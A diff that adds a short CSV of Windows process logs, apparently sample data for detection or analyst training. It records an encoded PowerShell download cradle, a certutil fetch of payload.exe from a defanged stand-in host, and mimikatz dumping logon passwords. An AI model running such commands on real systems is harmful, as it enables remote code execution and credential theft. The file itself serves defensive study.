@@ -1,0 +1,4 @@
+_time,host,user,process_name,parent_process,command_line
+2026-06-12 08:16:10,WIN10-ANALYST01,jsmith,powershell.exe,explorer.exe,"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+2026-06-12 08:16:45,WIN10-ANALYST01,jsmith,cmd.exe,powershell.exe,"cmd.exe /c certutil -urlcache -split -f hxxp://malicious-update[.]net/payload.exe payload.exe"
+2026-06-12 08:20:00,WIN10-ANALYST01,jsmith,mimikatz.exe,cmd.exe,"mimikatz.exe privilege::debug sekurlsa::logonpasswords"
